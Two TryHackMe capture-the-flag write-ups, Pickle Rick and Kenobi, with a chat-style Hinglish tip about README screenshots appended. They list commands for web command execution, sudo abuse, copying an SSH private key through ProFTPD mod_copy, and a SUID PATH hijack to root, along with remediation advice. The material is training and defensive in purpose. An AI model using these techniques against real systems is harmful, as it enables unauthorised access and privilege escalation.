
Web enumeration, command execution, and ingredient discovery

**Platform:** TryHackMe | **Difficulty:** Easy | **Room:** Picklerick

## Scope and environment

This write-up presents the approach used to complete the authorized TryHackMe Pickle Rick lab. The target is shown as <MACHINE_IP> because the room provides a temporary IP address whenever the machine is started.
<img width="1016" height="298" alt="01-nmap-scan" src="https://github.com/user-attachments/assets/b67d5459-b63a-44e9-82cf-03badbc2feb1" />


## Reconnaissance

I started by running a simple Nmap scan to determine which TCP services were exposed by the target.

nmap <MACHINE_IP>

The scan revealed two accessible ports: 22/tcp running SSH and 80/tcp serving HTTP. Since the challenge is centered around a web application, I concentrated on the HTTP service first.

Evidence - Initial Nmap scan displaying ports 22 and 80.

## Web enumeration

### HTML source inspection

I visited the web application and reviewed its HTML source. A developer comment in the source code revealed a username that could be useful for logging in.

Evidence - Username found inside an HTML comment.

**Username:** R1ckRul3s

### Directory enumeration

I ran Gobuster with PHP, HTML, and TXT extensions to discover files and directories that were not directly exposed through the main page.

gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

Evidence - Results returned by the Gobuster enumeration.

The enumeration returned login.php, robots.txt, and portal.php among other resources. The 302 redirect from portal.php to login.php suggested that the command interface was protected by authentication.

### Credential discovery in robots.txt

Before trying the login form, I checked robots.txt. Rather than containing only standard crawler rules, it exposed a single string. I considered that value a possible password for the username obtained from the source code.

Evidence - Password candidate exposed through robots.txt.

**Password candidate:** Wubbalubbadubdub

## Authentication

I entered the discovered username and password into login.php. The credentials were accepted, and the application redirected to the command panel at portal.php.

**Credentials:** R1ckRul3s / Wubbalubbadubdub

Evidence - Discovered credentials submitted through the portal login page.

## Command execution and the first ingredient

Once authenticated, the portal allowed operating-system commands to be executed. I began by listing the files in the current web directory.

ls

Evidence - Files displayed from the current web directory.

The directory listing contained Sup3rS3cretPickl3Ingred.txt. I used less to read the contents of this file.

less Sup3rS3cretPickl3Ingred.txt

Evidence - Contents returned from Sup3rS3cretPickl3Ingred.txt.

**First ingredient:** [REDACTED]

## Locating the second ingredient

After locating the first ingredient, I continued with filesystem enumeration by checking the root directory and then examining the directories inside /home.

ls /

Evidence - Listing of the root filesystem.

ls /home

Evidence - User directories discovered under /home.

ls /home/rick

Evidence - The file containing the second ingredient under /home/rick.

Because the filename includes a space, I placed the complete filename inside double quotes so the shell would interpret it as a single argument.

less /home/rick/"second ingredients"

Evidence - Contents retrieved from the second ingredients file.

**Second ingredient:** [REDACTED]

## Privilege context and the final ingredient

Before attempting to inspect /root, I first verified which operating-system account was being used to execute commands through the web portal.

whoami

Evidence - whoami output showing that portal commands execute as www-data.

The result was www-data, confirming that the command panel was operating under the web-service account rather than a normal user account.

I then checked whether this web-service account had permission to access privileged resources by running sudo ls /root. The command worked without asking for a password, indicating that www-data could use sudo for privileged access. The original evidence does not include a full sudo -l result, so the precise sudo policy was not established.

sudo ls /root

Evidence - /root successfully listed with elevated privileges.

The privileged directory listing showed 3rd.txt. I used the available sudo access to read the file.

sudo less /root/3rd.txt

Evidence - Contents of /root/3rd.txt.

**Final ingredient:** [REDACTED]

## Answer summary

The three room questions were completed in the same sequence as the three ingredients were located.

| Ingredient | Location |
|---|---|
| First | Sup3rS3cretPickl3Ingred.txt (web directory) |
| Second | /home/rick/second ingredients |
| Final | /root/3rd.txt |

The final answers remain intentionally redacted in this public version.

## Security findings

- Username exposed through an HTML source comment
- Sensitive data revealed through robots.txt
- Authenticated operating-system command execution was available
- The web-service account had excessive sudo permissions
- The web application was not adequately isolated from privileged system resources

## Remediation

- Remove usernames and other sensitive details from HTML comments.
- Do not place passwords, credentials, or secrets inside robots.txt.
- Avoid sending user-controlled input directly to operating-system commands.
- Use narrowly defined server-side functionality instead of unrestricted shell execution.
- Run the web application with only the privileges it actually requires.
- Remove unnecessary passwordless sudo permissions from www-data.

## Lessons learned

This room shows how several small security weaknesses can be combined into a complete attack path. Information disclosure revealed usable credentials, the authenticated command panel allowed filesystem discovery, and excessive sudo permissions ultimately exposed a file owned by root.





































 🥷 Kenobi — TryHackMe Write-Up

> A TryHackMe Linux machine focused on network enumeration, SMB/NFS enumeration, FTP exploitation, SSH key access, and privilege escalation.

## 📌 Room Information

| Information | Details |
|---|---|
| Platform | TryHackMe |
| Room | Kenobi |
| Difficulty | Easy |
| Category | Linux / Enumeration / Privilege Escalation |
| Target | `<MACHINE_IP>` |

---

## 🎯 Objective

The objective of this room is to enumerate the target machine, identify exposed services, obtain access to the Kenobi user, and finally escalate privileges to root.

---

# 🔎 1. Reconnaissance

I started by scanning the target to identify the open ports and running services.

```bash
nmap -sV -p- <MACHINE_IP>
```

The scan revealed several services, including:

- FTP — Port 21
- SSH — Port 22
- HTTP — Port 80
- RPCbind — Port 111
- SMB — Ports 139 and 445
- NFS — Port 2049

The presence of SMB, NFS, FTP, and HTTP made service enumeration the next priority.

---

# 🌐 2. SMB Enumeration

I started by checking the SMB service for available shares.

```bash
enum4linux <MACHINE_IP>
```

I also used:

```bash
smbclient -L //<MACHINE_IP>/
```

This helped identify the accessible SMB shares and gather information about the target.

---

# 📂 3. NFS Enumeration

Since NFS was running on port `2049`, I checked the available NFS exports.

```bash
showmount -e <MACHINE_IP>
```

An exposed NFS share was identified.

I created a local mount point:

```bash
mkdir /mnt/kenobiNFS
```

Then mounted the share:

```bash
mount <MACHINE_IP>:/var /mnt/kenobiNFS
```

After mounting it, I inspected the files available through the NFS share.

```bash
ls -la /mnt/kenobiNFS
```

---

# 📡 4. FTP Enumeration

Next, I investigated the FTP service.

```bash
nmap -p21 --script ftp-anon,ftp-syst <MACHINE_IP>
```

The service was running:

```text
ProFTPD 1.3.5
```

The version was important because this version is associated with a known `mod_copy` vulnerability.

---

# 💥 5. Exploiting ProFTPD mod_copy

The ProFTPD `mod_copy` module allows files to be copied using FTP commands such as:

```text
SITE CPFR
SITE CPTO
```

The goal was to use this functionality to copy a sensitive file into a location accessible through the NFS share.

I connected to the FTP service:

```bash
ftp <MACHINE_IP>
```

Then used the FTP commands to copy the SSH private key:

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

The private key was now available through the mounted NFS location.

---

# 🔑 6. Obtaining the SSH Private Key

I checked the NFS mount again:

```bash
ls -la /mnt/kenobiNFS/tmp/
```

The copied `id_rsa` file was present.

I copied it to my working directory:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
```

Since SSH requires the private key to have appropriate permissions, I changed its permissions:

```bash
chmod 600 id_rsa
```

---

# 🖥️ 7. SSH Access

Using the recovered private key, I connected to the target as the `kenobi` user.

```bash
ssh -i id_rsa kenobi@<MACHINE_IP>
```

After successfully authenticating, I obtained a shell as the `kenobi` user.

I then checked the current user:

```bash
whoami
```

```text
kenobi
```

---

# 🚩 8. User Flag

After obtaining access as `kenobi`, I searched the user's home directory for the first flag.

```bash
ls -la
```

The user flag could then be read from the appropriate file.

```bash
cat <user-flag-file>
```

---

# ⬆️ 9. Privilege Escalation

The next step was to search for SUID binaries that could potentially be abused for privilege escalation.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the results, the following binary was particularly interesting:

```text
/usr/bin/menu
```

I examined the binary and its behavior to understand how it executed system commands.

The important issue was that the program relied on commands being found through the system `PATH`.

---

# 🧨 10. PATH Hijacking

I created a malicious executable that would execute a shell.

```bash
echo '/bin/bash' > /tmp/curl
```

Then made it executable:

```bash
chmod 777 /tmp/curl
```

I modified the `PATH` so that `/tmp` would be searched before the normal system directories:

```bash
export PATH=/tmp:$PATH
```

I then executed the SUID binary:

```bash
/usr/bin/menu
```

When the vulnerable option was selected, the program executed the malicious `curl` file from `/tmp`.

This resulted in a privileged shell.

---

# 👑 11. Root Access

I verified the current privileges:

```bash
whoami
```

The result was:

```text
root
```

I had successfully escalated from the `kenobi` user to `root`.

The root flag could then be retrieved from the root user's directory.

```bash
cat /root/<root-flag-file>
```

---

# 🧰 Tools Used

- Nmap
- Enum4linux
- SMBClient
- Showmount
- NFS
- FTP
- ProFTPD
- SSH
- Linux enumeration commands

---

# 🔐 Key Vulnerabilities

The main security issues demonstrated in this room were:

- Exposed network services
- Accessible NFS export
- SMB information disclosure
- Vulnerable ProFTPD `mod_copy` functionality
- Exposure of an SSH private key
- SUID binary abuse
- PATH hijacking

---

# 🛡️ Security Recommendations

To prevent these vulnerabilities:

- Disable unnecessary network services.
- Restrict NFS exports to trusted hosts.
- Properly configure SMB permissions.
- Keep ProFTPD and other services updated.
- Never expose private SSH keys through shared directories.
- Review SUID binaries regularly.
- Avoid using relative command paths in privileged programs.
- Use absolute paths when privileged applications execute system commands.
- Apply the principle of least privilege.

---

# 📚 Lessons Learned

The Kenobi room demonstrates how several configuration and software weaknesses can be chained together.

The important concepts covered are:

- Network service enumeration
- SMB enumeration
- NFS enumeration and mounting
- FTP service enumeration
- ProFTPD `mod_copy`
- SSH key extraction
- Linux SUID enumeration
- PATH hijacking
- Privilege escalation

---

## ⚠️ Disclaimer

This write-up is intended for the authorized TryHackMe Kenobi lab environment.

Do not use these techniques against systems without explicit authorization.
```

**GitHub README ke liye picture bhi add karni ho**, to tum apne screenshots ko repo ke `images/` folder mein rakhkar sections ke neeche is format mein laga sakte ho:

```markdown
![Nmap Scan](images/nmap.png)
```

```markdown
![SMB Enumeration](images/smb-enumeration.png)
```

```markdown
![NFS Enumeration](images/nfs.png)
```

```markdown
![FTP Enumeration](images/ftp.png)
```

```markdown
![SSH Access](images/ssh.png)
```

```markdown
![Privilege Escalation](images/privilege-escalation.png)
```

Isse README **text + screenshots ke saath proper cybersecurity portfolio write-up** lagega, sirf commands ki list nahi.


